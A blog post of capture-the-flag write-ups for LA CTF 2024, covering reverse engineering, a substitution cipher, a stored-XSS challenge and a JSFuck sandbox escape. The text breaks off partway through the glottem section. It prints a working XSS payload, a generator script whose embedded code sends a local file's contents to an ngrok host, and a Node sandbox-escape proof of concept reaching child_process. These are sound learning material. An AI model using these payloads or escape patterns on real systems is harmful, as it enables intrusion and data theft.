---
layout: post
title: LA CTF 2024
description: With graph theory, CSS can steal your password.
date: 2024-02-18
tags:
  - programming
  - ctf
---

As [ACM Cyber at UCSD][acmucsd], we played as one team for [LA CTF][lactf], hosted by [ACM Cyber at UCLA][acmucla]. Since the Open Division (i.e. non-UCLA) has no team size restriction, one could say that our team encompasses all of UCSD. Altogether, we placed 18th globally, of over 1000 teams, and solved 38 of the 53 challenges available.

[acmucsd]: https://acmucsd.com/communities#Cyber
[acmucla]: https://www.acmcyber.com/
[lactf]: https://lac.tf/

Here are the challenges I worked on, listed hardest (i.e. most interesting) first:

- [**web/quickstyle**](#webquickstyle): CSS injection with a bit of DOM clobbering. Unlike other CSS injection challenges, you must exfiltrate the flag with a single CSS file, and it has to be under 6 MB. This involved graph theory also used in bioinformatics.
- [**misc/jsfudge**](#miscjsfudge): [JSFuck][jsfuck] with some slight adjustments.
- [**rev/glottem**](#revglottem): Building a list of possible flags, character by character. Because this list grows exponentially, I manually intervened to keep only the partial flags that looked like English.
- [**web/new-housing-portal**](#webnew-housing-portal): XSS.
- [**crypto/selamat pagi**](#cryptoselamat-pagi): Frequency analysis, and the Indonesian Wikipedia.
- [**rev/aplet321**](#revaplet321): Decompiled the binary to find a system of equations to solve.
- [**rev/shattered-memories**](#revshattered-memories): [`strings`][strings].

[jsfuck]: https://jsfuck.com/
[strings]: https://en.wikipedia.org/wiki/Strings_(Unix)

The following sections are listed in chronological order of when I worked on it. I recommend reading at least jumping to [web/quickstyle](#webquickstyle) since I think it's the most interesting challenge (an attack using just CSS).

## rev/shattered-memories

> **rev/shattered-memories**
> by aplet123.
> 697 solves / 115 points
>
> I swear I knew what the flag was but I can't seem to remember it anymore... can you dig it out from my inner psyche?
>
> **Downloads**:
> [shattered-memories](https://github.com/uclaacm/lactf-archive/blob/main/2024/rev/shattered-memories/shattered-memories)

This was the first challenge I looked at. I tried looking at the assembly, but then a teammate walked by, glanced at it, and suggested using `strings` on it.

```shell
$ strings ./shattered-memories
What was the flag again?
No, I definitely remember it being a different length...
t_what_f
t_means}
nd_forge
lactf{no
orgive_a
No, that definitely isn't it.
I'm pretty sure that isn't it.
I don't think that's it...
I think it's something like that but not quite...
There's something so slightly off but I can't quite put my finger on it...
Yes! That's it! That's the flag! I remember now!
;*3$"
```

Well, there are pieces of the flag:

- `t_what_f`
- `t_means}`
- `nd_forge`
- `lactf{no`
- `orgive_a`

And so the rest of the challenge was just putting the pieces together, which I did manually: `t_what_f` made the most sense after `no` to form "not"; the `f` completes the beginning of "forgive" in `orgive_a`; and "and" with `nd_forge`; leaving `t_means}`.

The flag is `lactf{not_what_forgive_and_forget_means}`.

## rev/aplet321

> **rev/aplet321**
> by kaiphait.
> 445 solves / 199 points
>
> Unlike Aplet123, Aplet321 might give you the flag if you beg him enough.
>
> `nc chall.lac.tf 31321`
>
> **Downloads**:
> [Dockerfile](https://github.com/uclaacm/lactf-archive/blob/main/2024/rev/aplet321/Dockerfile) [aplet321](https://github.com/uclaacm/lactf-archive/blob/main/2024/rev/aplet321/aplet321)

The [teammate from earlier](#revshattered-memories) had already solved it, and was reeling with laughter from the solution, but he didn't submit the flag.

He suggested I install [Ghidra][ghidra], but its installation seemed too involved (it's a large ZIP file, and it requires having Java installed and running a script I couldn't find after finally extracting everything). So I uploaded the file to [Dogbolt][dogbolt-aplet321] instead.

[ghidra]: https://ghidra-sre.org/
[dogbolt-aplet321]: https://dogbolt.org/?id=4c61df44-da40-4158-80b4-f4155fbf227e

```c
setbuf(stdout,(char *)0x0);
puts("hi, i\'m aplet321. how can i help?");
fgets(&local_238,0x200,stdin);
sVar2 = strlen(&local_238);
if (5 < sVar2) {
  iVar4 = 0;
  iVar5 = 0;
  pcVar3 = &local_238;
  do {
    iVar1 = strncmp(pcVar3,"pretty",6);
    iVar5 = iVar5 + (uint)(iVar1 == 0);
    iVar1 = strncmp(pcVar3,"please",6);
    iVar4 = iVar4 + (uint)(iVar1 == 0);
    pcVar3 = pcVar3 + 1;
  } while (pcVar3 != acStack_237 + ((int)sVar2 - 6));
  if (iVar4 != 0) {
    pcVar3 = strstr(&local_238,"flag");
    if (pcVar3 == (char *)0x0) {
      puts("sorry, i didn\'t understand what you mean");
      return 0;
    }
    if ((iVar5 + iVar4 == 0x36) && (iVar5 - iVar4 == -0x18)) {
      puts("ok here\'s your flag");
      system("cat flag.txt");
      return 0;
    }
    puts("sorry, i\'m not allowed to do that");
    return 0;
  }
}
puts("so rude");
return 0;
```

`local_238` has the user input, and `sVar2` is its length (which must be greater than 5 characters).

`pcVar3` seems to be like `i` in a for loop, incrementing in every iteration. It's a pointer to the current character in the loop and compares the next 6 characters from the pointer to `pretty` and `please`, incrementing `iVar5` and `iVar4` if so, respectively. The loop probably stops 6 characters before the end of the string (with the `sVar - 6`). This part counts the number of `pretty`s and `please`s in the input.

In JavaScript, the equivalent code might look something like this:

```js
let pretties = 0
let pleases = 0
for (let i = 0; i < input.length - 6; i++) {
  pretties += input.slice(i, i + 6) === 'pretty'
  pleases += input.slice(i, i + 6) === 'please'
}
```

Then, later, before printing the contents of `flag.txt`, it checks if `(iVar5 + iVar4 == 0x36) && (iVar5 - iVar4 == -0x18)`. This is a system of equations:

$$
\begin{cases}
  a + b = 54 \\
  a - b = -24
\end{cases}
$$

So that's $2a = 30 \to a = 15$ `pretty`s and $2b = 78 \to b = 39$ `please`s.

```js
> 'pretty'.repeat(15) + 'please'.repeat(39)
'prettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettypleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleaseplease'
```

```shell
$ nc chall.lac.tf 31321
hi, i'm aplet321. how can i help?
prettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettypleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleaseplease
sorry, i didn't understand what you mean
```

Why didn't that work? Well, there's also the `strstr(&local_238,"flag")` line that can't be `0x0`. [`strstr`][strstr] finds the second string, `flag`, in the first string, which is the input, and returns null if it can't find it. So we just need to add `flag` to our input:

```shell
$ nc chall.lac.tf 31321
hi, i'm aplet321. how can i help?
prettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettypleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleaseflag
ok here's your flag
lactf{next_year_i'll_make_aplet456_hqp3c1a7bip5bmnc}
```

That is a pretty amusing way to get a flag.

[strstr]: https://cplusplus.com/reference/cstring/strstr/

## crypto/selamat pagi

> **crypto/selamat pagi**
> by AVDestroyer.
> 331 solves / 275 points
>
> If you talk in another language, nobody can understand what you say! Check out this message I sent in Indonesian. To add some extra security, I also applied a monoalphabetic substitution cipher on it!
>
> **Downloads**:
> [message.txt](https://github.com/uclaacm/lactf-archive/blob/main/2024/crypto/selamat-pagi/message.txt)

```
Efe kqkbkx czwkf akfs kdkf qzfskf wzdcjtfk
Ieqku kqk akfs ikxj kck akfs wkak ukikukf :Q
Lzfqztk ukdj kqk qe wefe: bkvim{wzbkdki_ckse_kckukx_ukdj_wjuk_kfkbewew_mtzujzfwe}
```

I wasn't the one who started working on this one. I just heard Indonesian mentioned and was like, "languages?"

Our team used [dcode.fr's substitution cipher tool][dcode] to plug in letters visually.

`bkvim` is very likely to be `lactf`:

```
... a.ala. ...a. .a.. a.a. ....a. .......a
t..a. a.a .a.. ta.. a.a .a.. .a.a .ata.a. :.
......a .a.. a.a .. ....: lactf{..la.at_.a.._a.a.a._.a.._...a_a.al...._f........}
```

Our team had been plugging words into Google Translate to see what words could be. I thought that "flag" would very likely be in the text, so I used Wiktionary to look up the Indonesian translation for "flag": [_bendera_][bendera]. Their [Wikipedia article for the Indonesian flag][wiki] also uses _bendera_.

[bender]: https://en.wiktionary.org/wiki/bendera#Indonesian
[wiki]: https://id.wikipedia.org/wiki/Bendera_Indonesia
[dcode]: https://www.dcode.fr/monoalphabetic-substitution

The only 7-lever word that could fit _bendera_ was `......a`. Putting the letters in produces:

```
.n. adala. .e.an .an. a.an den.an .e...rna
t.da. ada .an. ta.. a.a .an. .a.a .ata.an :d
bendera .a.. ada d. ..n.: lactf{.ela.at_.a.._a.a.a._.a.._...a_anal...._fre..en..}
```

Maybe you can already see it, but my teammates, from plugging in other words, had already identified other letters like U and S:

```
.n. adala. .esan .an. a.an den.an se..urna
t.da. ada .an. ta.u a.a .an. sa.a .ata.an :d
bendera .a.u ada d. s.n.: lactf{sela.at_.a.._a.a.a._.a.u_su.a_anal.s.s_fre.uens.}
```

That `anal.s.s_fre.uens.` looks a lot like "frequency analysis." My teammates tried to plug in Q and Y, which I think is a bit English-minded because Q and Y are extremely unusual letters to use for the sounds /k/ and /i/. Particularly for a language that adopted the Latin alphabet, using K and I for those phonemes is much more common.

```
ini adala. .esan .an. a.an den.an se..urna tidak ada .an. ta.u a.a .an. sa.a katakan :d bendera ka.u ada di sini: lactf{sela.at_.a.i_a.aka._ka.u_suka_analisis_frekuensi}
```

I wasn't around when they finished the rest of the letters, but it was pretty quick. For example, Google autocomplete for _ini adala_ gives _ini adalah kerana_, so the letter after _adala_ must be H. Also, `sela.at` looks like it could be _selamat_ from the challenge name. And the word after, `.a.i`, could be _pagi_. And while this is already enough for the flag, there's still a missing letter remaining in `.ang`. Going down this [Indonesian letter frequency list][indofreq], it seems the most frequent letter we haven't used yet is Y. This produces:

```
Ini adalah pesan yang aman dengan sempurna
Tidak ada yang tahu apa yang saya katakan :D
Bendera kamu ada di sini: lactf{selamat_pagi_apakah_kamu_suka_analisis_frekuensi}
```

And through Google Translate:

> This is a perfectly secure message
>
> No one knows what I said :D
>
> Your flag is here: `lactf{good_morning_do_you_like_frequency_analysis}`

[indofreq]: https://www.sttmedia.com/characterfrequency-indonesian

## web/new-housing-portal

> **web/new-housing-portal**
> by r2uwu2.
> 214 solves / 368 points
>
> After that old portal, we decided to make a new one that is ultra secure and not based off any real housing sites. Can you make Samy tell you his deepest darkest secret?
>
> Hint - You can send a link that the admin bot will visit as samy.
>
> Hint - Come watch the real Samy's talk if you are stuck!
>
> Site - [new-housing-portal.chall.lac.tf](https://new-housing-portal.chall.lac.tf/)
>
> Admin Bot - <https://admin-bot.lac.tf/new-housing-portal>
>
> **Downloads**:
> [new-housing-portal.zip](https://github.com/uclaacm/lactf-archive/tree/main/2024/web/new-housing-portal)

Someone in the room mentioned JavaScript, which got my attention. They were apparently just too lazy to write the XSS payload for this challenge, so I decided to try it.

![The landing page for new-housing-portal is a login page.](../images/lactf/nhp-login.png)

![The home page after logging in](../images/lactf/nhp-home.png)

The website is a roommate finder[^1]. On the "Find Roomates" page, you search users by their username, then invite them. The "View Invitations" page lists the invites that were sent to you.

[^1]: Something I never got to use at UCSD because UCSD didn't have a two-year housing guarantee.

The vulnerability is somewhat obvious by looking at the source code, which is both conveniently provided in the ZIP file and the page source.

<!-- prettier-ignore -->
```js
// src/finder/index.js
const params = new URLSearchParams(location.search);
const query = params.get('q');
if (query) {
  (async () => {
    const user = await fetch('/user?q=' + encodeURIComponent(query))
      .then(r => r.json());
    if ('err' in user) {
      $('.err').innerHTML = user.err;
      $('.err').classList.remove('hidden');
      return;
    }
    $('.user input[name=username]').value = user.username;
    $('span.name').innerHTML = user.name;
    $('span.username').innerHTML = user.username;
    $('.user').classList.remove('hidden');
  })();
}
```

<!-- prettier-ignore -->
```js
// src/request/index.js
const { invitations } = await fetch('/invitation').then(r => r.json());
$('.invitations').innerHTML = invitations.map((inv) => `
  <div class="invitation">
    <div class="col">
      <div class="from">From: ${inv.from}</div>
      <div class="secret">Deepest Darkest Secret: ${inv.deepestDarkestSecret}</div>
    </div>
    <div class="col">
      <button>Accept</button>
    </div>
  </div>
`).join('\n');
```

Both of these pages use `innerHTML` without any sanitization, so a standard XSS payload like `<img src=x onerror="alert(1)">` should work. This tries to load a nonexistent image at `/x` and fails, running the JavaScript in the `onerror` handler.

It seems any of the values on the registration page---the username, name, and the "Deepest Darkest Secret"---are all opportunities for XSS.

So where's the flag? The provided ZIP also has the server code:

<!-- prettier-ignore -->
```js
// src/server.js
users.set('samy', {
  username: 'samy',
  name: 'Samy Kamkar',
  deepestDarkestSecret: process.env.FLAG || 'lactf{test_flag}',
  password: process.env.ADMINPW || 'owo',
  invitations: [],
  registration: Infinity
});
```

So I need to get Samy's deepest, darkest secret for the flag. It displays deepest darkest secrets on the invitations page, so I just need to get Samy to invite me. Using the admin bot, I need to get Samy on a page that has my XSS on it to make him invite me.

There are a few opportunities for this:

- I could sign up with an XSS payload in our name or username, then send him a link to `https://new-housing-portal.chall.lac.tf/finder/?q=<username>`, where it will show the name/username with the XSS payload.
- I could invite Samy and send him a link to `https://new-housing-portal.chall.lac.tf/request/`. My invitation, with the XSS payload in the name[^2], would show up on his page.

[^2]: The deepest darkest secret doesn't work because the server just sets it to `todo` for all non-Samy users.

I opted for the second strategy.

To make Samy invite me, I just had to create an account with its name set to an XSS payload. It should mimic the HTTP request that the website makes when I send an invite. With inspect element's network log open, I invited a user `b`, then copied the POST request entry as fetch. Here's the request, with irrelevant headers removed:

```http
POST /finder HTTP/1.1
Host: new-housing-portal.chall.lac.tf
Content-Type: application/x-www-form-urlencoded

username=b
```

The following HTML makes the same POST request, except for it invites my username, `a`, instead.

<!-- prettier-ignore -->
```js
<img src=x onerror="fetch('/finder', { method: 'POST', body: (f = new FormData(), f.append('username', 'a'), f) })">
```

I created a new account in incognito mode with its name set to the HTML, then I invited myself. Then, in my invitations, I saw a broken image:

![Invitations to room with you: From: [broken image] Deepest Darkest Secret: todo](../images/lactf/nhp-invite.png)

I checked the network log to see what it sent.

![The network log has entries for `finder` and `finder?err=username%20does%20not%20exist`](../images/lactf/nhp-fail-post.png)

So why didn't it work?

After playing around with my code, I realized why when I looked at what my code was sending:

![------WebKitFormBoundaryAYicWtFJFI9v1WHB Content-Disposition: form-data; name="username" a ------WebKitFormBoundaryAYicWtFJFI9v1WHB--](../images/lactf/nhp-request.png)

It seems by using JavaScript's `FormData` object, it always wraps its data in some `WebKitFormBoundary`, which the server doesn't seem to accept. So I got rid of it and set the `Content-Type` manually instead:

```js
fetch('/finder', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'username=b'
})
```

Running this in the console seemed successful based on the network log.

![The network log has entires for `finder` and `finder?msg=invitation%20sent!`](../images/lactf/nhp-invite-sent.png)

So, I created a new account with the fixed HTML:

<!-- prettier-ignore -->
```js
<img src=x onerror="fetch('/finder', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=a' })">
```

I invited `samy`, then made the admin bot visit `https://new-housing-portal.chall.lac.tf/request/`. I checked my invitations:

![From: samy. Deepest Darkest Secret: lactf{b4t_m0s7_0f_a77_y0u_4r3_my_h3r0}](../images/lactf/nhp-flag.png)

## misc/jsfudge

> **misc/jsfudge**
> by r2dev2.
> 31 solves / 486 points
>
> JsFudge this JsFudge that, why don't you JsFudge the flag.
>
> `nc chall.lac.tf 31130`
>
> **Downloads**:
> [Dockerfile](https://github.com/uclaacm/lactf-archive/blob/main/2024/misc/jsfudge/Dockerfile) [index.js](https://github.com/uclaacm/lactf-archive/blob/main/2024/misc/jsfudge/index.js)

Most of the telltale clues are in the `runCode` definition in index.js, which ultimately just `eval`s whatever code you submit. However, there's two catches:

<!-- prettier-ignore -->
```js
const allowed = new Set('()+[]!');
for (const char of code) {
  if (!allowed.has(char)) {
    console.log('Oops, make sure to only use characters "()+[]!"');
    return;
  }
}
```

This means `code` must only use `()+[]!`. This is infamously [JSFuck][jsfuck]'s character set, where all of JavaScript can be executed using just those characters. The [JSFuck website][jsfuck] has a converter for arbitrary JS into equivalent JavaScript that only uses the characters in `()+[]!`.

However, you can't just use the convert for this challenge:

<!-- prettier-ignore -->
```js
// hehe ^w^
const oldProto = [].__proto__.toString;
[].__proto__.toString = () => '^w^';
```

Normally, JavaScript arrays, when casted to a string, will cast each of its elements to a string then join them together with a comma `,`. For example, `'' + [1, 2, 3]` produces the string `1,2,3`. However, the effect of this is that casting arrays to strings always returns the string `^w^` instead of the contents of the array.

What does this change? Well, JSFuck relies on JavaScript's current array-to-string behavior for two important values:

- Producing zero. Currently, casting an empty array `[]` to a string produces the empty string. An empty string casted to a number is 0. Since using `+` as a unary operator only makes sense for numbers, JavaScript will cast values to a number if you use `+` on it. So, `+[]` produces 0 in JavaScript.

  But now that `[]` becomes `^w^`, `+[]` becomes `+'^w^`. `^w^` is not a number, so this becomes `NaN` instead of 0.

  Fortunately, the workaround is to cast `NaN` into a boolean using `!` (the logical NOT operator)---`NaN` is falsy, so it becomes `false`---then cast `false` to a number, 0. `+!!+[] == +!!+'^w^' == +!!NaN == +!true == +false == 0`

  However, this doesn't break creating non-zero numbers. JSFuck takes advantage of 0 being falsy, and inverting it makes it `true`. Casting `true` to a number produces 1, which you can add to itself to produce the natural numbers: `+!+[]` is 1, `+!+[]+!+[]` is 2, and so on.

- Casting to a string. Since an empty array becomes an empty string, you can add it to any value to turn it into a string. `![]+[]` becomes the string `'false'`, and so on.

  With the `^w^` change, `![]+[]` becomes `false^w^`. This doesn't actually break too many things because much of JSFuck involves getting letters of keywords, like doing `(![]+[])[2]` for the letter `l`; adding `^w^` to the end of the string doesn't affect this.

  However, this change does affect numbers. JSFuck's convert in particular much prefers values like `10` over `9`, which is smaller but has a larger sum of digits. This is because producing 10 only involves concatenating 1 and 0, then casting it to a number (`+(+!+[] + [+[]]) == +(1 + [0]) == +(1 + '0') == +'10' == 10`), while producing 9 requires adding 1 to itself nine times.

  Now, even when fixing 0 by replacing `+[]` with `+!!+[]` as discussed above, `+(+!+[] + [+!!+[]])` instead evaluates to `+(1 + [0])` then `+(1 + '0^w^')` then `+'10^w^'` then `NaN`. Sad!

  Maybe there's a smarter way around this. But I'm not optimizing for code length; I just need my code to work. So I just replaced these two-digit numbers with 1 added to itself ten or more times.

I wanted to try just returning `[].__proto__.toString` back to its original form, so I put it into JSFuck's converter and tried to fix any issues caused by the change. These were the substitutions I did to code generated by JSFuck:

- 0: `[+[]]` → `[+!!+[]]`

  0 was most often used to index into strings, which is why it's in square brackets.

- 10: `+!+[]+[+!!+[]]` → `!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]`

- 11: `[+!+[]+[+!+[]]]` → `[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]`

  This was for the letter `m`.

- 12: `+!+[]+[!+[]+!+[]]` → `!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]`

- `i`: `([![]]+[][[]])[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]` → `([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]`

  The original way used `'falseundefined'[10]` because it probably produced shorter code, but now it becomes `'^w^undefined'[10]`, which is `undefined` and usually results in a TypeError. I replaced it with `'undefined^w^'[5]`.

- `/`: `(![]+[+!!+[]])[([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]` → `(![]+[+!!+[]])[([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+!!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+!!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+!!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]`

  JSFuck gets `/` by calling `'false0'.italics()`, which wraps it into `<i>false0</i>`. This string was probably selected for its shorter code length, but because it relies on concatenation it becomes `<i>false^w^</i>`, which changes the index of `/` in the string.

  What's `/` for? JSFuck uses it to create a function[^10] with body `return/false/`, which returns a `RegExp` object instance. It can then do `/false/.constructor` to get the `RegExp` constructor, then construct `RegExp('/')` which creates a regular expression that just has a `/`. However, in JavaScript's regular expression literals, `/` must be escaped, so casting `RegExp('/')` to a string produces a string containing `/\//`.

  So `Function('return/false/').constructor('/') + ''` is how JSFuck gets a backslash character `\`.

And what's the backslash character for? The underscore character `_` for `__proto__`. JSFuck creates a function that returns a string with an octal escape sequence, then calls it: `Function('return"\137"')()`.

[^10]: You might be wondering how JSFuck can create a function in the first place. You can get `a` from `false` and `t` from `true`, and arrays have an `at` method. `[]['a' + 't']` gives access to a function. It's also possible to get the letters in `constructor`, so you can use `[]['at']['constructor']` to get a reference to `Function`. You can use `Function` to convert strings to functions; for example, `Function('return 3')` creates a function that returns 3.

In doing this, I realized that my plan of trying to reset `[].__proto__.toString` wouldn't work because I also needed access to the original `Array.prototype.toString`. While I felt like it was possible, I couldn't be bothered to try to investigate and fix more issues caused by an even longer string needed.

However, I realized that from investigating how the `_` code works, I could adapt it to get any character I wanted. All I needed to do was write a script:

<!-- prettier-ignore -->
```js
[].__proto__.toString=()=>'^w^'
backslash = `...`
// create octal codes
w=(Array.from(`require('https').get('https://57e8-104-177-117-127.ngrok-free.app/' + require('fs').readFileSync('.vimrc').toString())`, c => `${backslash}+(${'!+[]+'.repeat(+c.codePointAt().toString(8)).slice(0, -1)})`).join('+'))
// return string of octal codes
w=`...${w}...`
// eval string expression
w=`[][...]
(${w})
()`
// eval it
w=`[][...]
(${w})
()`
w = w.replace(/\s/g, '')
console.log(w)
```

What this does is,

1. Store the JSFuck code for a backslash character in `backslash` for convenience.

2. Split the code of the attack script I want to execute into characters, convert the characters into an octal escape sequence (`backslash` + the code point of the character in base 8), then join them all together with `+` signs. This sets `w` to code to generate a long string of octal sequences.

3. Wrap `w` in code that puts the octal sequences in a string literal. This is essentially the same as

   ```js
   w = `return "${w}"`
   ```

4. Wrap `w` in code that converts the string into a function then calls it.

   ```js
   w = `Function(${w})()`
   ```

   All this is just to produce a string containing the original attack script.

5. Wrap `w` again to actually call my script:

   ```js
   w = `Function(${w})()`
   ```

So I ran the script to generate code, which I pasted into a casual 350-kB file that I piped into the `nc` server.

```shell
$ cat test/lactf-jsfudge.js | nc chall.lac.tf 31130
Gimme some js code to run
oopsie woopsie stinki poopie ReferenceError: require is not defined
    at eval (eval at <anonymous> (eval at runCode (/app/run:16:21)), <anonymous>:3:1)
    at eval (eval at runCode (/app/run:16:21), <anonymous>:1:350288)
    at runCode (/app/run:16:21)
    at /app/run:31:5
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
```

What?

Even though it didn't look like it in index.js, `eval` seemed to be sandboxed somehow, and `require` wasn't directly available.

Okay, fine. I vaguely recalled from a [prior challenge][prior] that it can be fairly trivial to bypass this. I looked online and found [this vulnerability][vuln], which gave a pretty simple proof of concept:

[prior]: http://127.0.0.1:4000/longer-tweets/ctf/#ctf-node-calculator-escape-vm-codegeneration-false
[vuln]: https://security.snyk.io/vuln/SNYK-JS-SAFEEVAL-3373064

<!-- prettier-ignore -->
```js
const safe_eval = require('safe-eval')
code = `
import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('touch rce')
`
safe_eval(code)
```

This gets a `Promise` object's constructor (`Promise`)'s constructor (`Function`) to create a function that returns `process`, then access `require` via `process.mainModule.require`.

My exfiltration script looked very similar:

<!-- prettier-ignore -->
```js
console.log(import('fs').constructor.constructor('return process')().mainModule.require('fs').readFileSync('flag.txt').toString())
```

```shell
$ cat test/lactf-jsfudge.js | nc chall.lac.tf 31130
Gimme some js code to run
lactf{d0_y0u_f331_pr0ud}

oopsie woopsie stinki poopie TypeError: Cannot read properties of undefined (reading 'toString')
    at runCode (/app/run:17:25)
    at /app/run:31:5
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
```

Here's links to [lactf-jsfudge.js][gen] (392 kB) and the [code that generates it][gener].

[gen]: ../files/lactf/lactf-jsfudge.js
[gener]: ../files/lactf/jsfudge-codegen.js

## rev/glottem

> **rev/glottem**
> by aplet123.
> 89 solves / 455 points
>
> Haha glottem good!
>
> Note: The correct flag is 34 characters long.
>
> **Downloads**:
> [glottem](https://github.com/uclaacm/lactf-archive/blob/main/2024/rev/glottem/glottem)

This is a pretty cool challenge.

```sh
#!/bin/sh
1<<4201337
1//1,"""
exit=process.exit;argv=process.argv.slice(1)/*
4201337
read -p "flag? " flag
node $0 "$flag" && python3 $0 "$flag" && echo correct || echo incorrect
1<<4201337
*///""";from sys import argv
e = [...]
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1];1//1;"""
/*"""
#*/for (let i = 0; i < s.length; i ++) {/*
for i in range(6,len(s)-2):
    #*/d=(d*31+s.charCodeAt(i))%93097/*
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]#*/}
exit(+(d!=260,[d!=61343])[0])
4201337
```

(That `e = [...]` line is a long 3D array of numbers ranging from 10 to 17.)

The `#!/bin/sh` line suggests that it's a Bash script (more accurately, just `sh` for shell). But other lines in the code, as hinted by the `node` and `python3` commands, suggest that it might also be a JavaScript and Python file. It's a [polyglot] (hence the challenge name)!

[polyglot]: https://en.wikipedia.org/wiki/Polyglot_(computing)

The syntax highlighting might not show it very well, but in Bash, the first and last commands don't do anything:

```sh
1<<4201337
1//1,"""
exit=process.exit;argv=process.argv.slice(1)/*
4201337
```

My impression of this is that `4201337` is just a string to indicate the start and end of a raw string, so you don't have to worry about escaping any characters inside there. I thought that maybe `<<` is like how `>>` is to `>`, where it pipes the contents of some file with that name into a command `1`, which is an alias for true. While writing this write-up, I looked up what `<<` does, and I appear to be completely wrong. Oh well.

So the only relevant lines, from Bash's point of view, are

```sh
e = [...]
read -p "flag? " flag
node $0 "$flag" && python3 $0 "$flag" && echo correct || echo incorrect
```

1. The first command stores a list in `e`, which isn't used anywhere. It doesn't do anything.
2. The second command asks the user for the flag and stores it in a variable `flag`.
3. The third command passes the flag to Node and Python, running it on the same `glottem` file. If they both pass, then it echoes `correct`.

So we just need the Node and Python interpretations to accept our flag.

In JavaScript, the code looks like this:

<!-- prettier-ignore -->
```js
#!/bin/sh
1<<4201337
1//1,"""
exit=process.exit;argv=process.argv.slice(1)/*
4201337
read -p "flag? " flag
node $0 "$flag" && python3 $0 "$flag" && echo correct || echo incorrect
1<<4201337
*///""";from sys import argv
e = [...]
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1];1//1;"""
/*"""
#*/for (let i = 0; i < s.length; i ++) {/*
for i in range(6,len(s)-2):
    #*/d=(d*31+s.charCodeAt(i))%93097/*
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]#*/}
exit(+(d!=260,[d!=61343])[0])
4201337
```

The numbers, `1<<4201337`, `1`, and `4201337` don't do anything. While JavaScript's comment syntax uses `//`, it also ignores lines starting with `#!` at the beginning of the file.[^11]

[^11]: This was originally a Node-specific feature but has recently been [standardized into JavaScript][shebang], adding a fourth comment syntax to JavaScript's existing family of `//`, `/* */`, and `<!-- -->`.

[shebang]: https://github.com/tc39/proposal-hashbang

This leaves the following lines:

```js
exit=process.exit;argv=process.argv.slice(1)
e = [...]
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1];
for (let i = 0; i < s.length; i ++) {
  d=(d*31+s.charCodeAt(i))%93097
}
exit(+(d!=260,[d!=61343])[0])
```

Interestingly, this doesn't use `e` either. It creates aliases for `exit` and `argv` so some of the statements can be the same in Python and JavaScript.

`s` is the flag (including the `lactf{...}` part), and it loops over each character's code point and does some math with it. The `%93097` is a bit annoying because modular arithmetic is hard to undo.

The final line, `exit(+(d!=260,[d!=61343])[0])`, is interesting and I'll ramble more about it when looking at Python. But ultimately, `d` just needs to equal `61343` at the end for the script to exit with 0, which means success in Bash.

I tried to work backwards. Even though I don't know what `d` was, I knew that it couldn't be more than 93097, and before being added to the character code, it would be multiplied by 31. So, I thought, maybe I could try guessing all the characters in `alpha` and see which of them have a `d` that could result in `61343`.

<!-- prettier-ignore -->
```js
MOD = 93097
ALPHA="abcdefghijklmnopqrstuvwxyz_"
check = (last,alpha=ALPHA) => {
  poss = []
for (const c of alpha) {
  for (let i = 0; i < 32; i++ ) if ((last + MOD*i - c.charCodeAt()) % 31 === 0) poss.push({ char:c, newD:(last + MOD*i - c.charCodeAt())/31})
}
  return poss
}
last = check(61343, '}')[0].newD
check(last)
```

I know that the last character of `s` is `}` because of the flag format. And the one before it?

![A list of pretty much every letter and a corresponding potential `d` value.](../images/lactf/glot-js-guess.png)

I guess it barely narrows anything at all?

Let's look at the script with a Python lens.

```py
#!/bin/sh
1<<4201337
1//1,"""
exit=process.exit;argv=process.argv.slice(1)/*
4201337
